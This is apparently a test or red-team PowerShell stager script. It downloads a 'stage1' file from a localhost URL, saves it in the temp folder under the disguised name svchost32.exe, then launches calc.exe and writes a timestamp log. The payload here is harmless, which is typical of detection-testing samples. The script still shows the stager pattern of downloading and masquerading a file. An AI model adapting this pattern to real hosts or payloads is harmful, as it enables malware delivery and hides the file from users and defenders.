
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://localhost:9001/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svchost32.exe",
    [int]$TransferTimeout = 153
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Invoke-StageDownload -SourceUrl $TargetUrl -DestinationPath $OutputPath -TimeoutSec $TransferTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
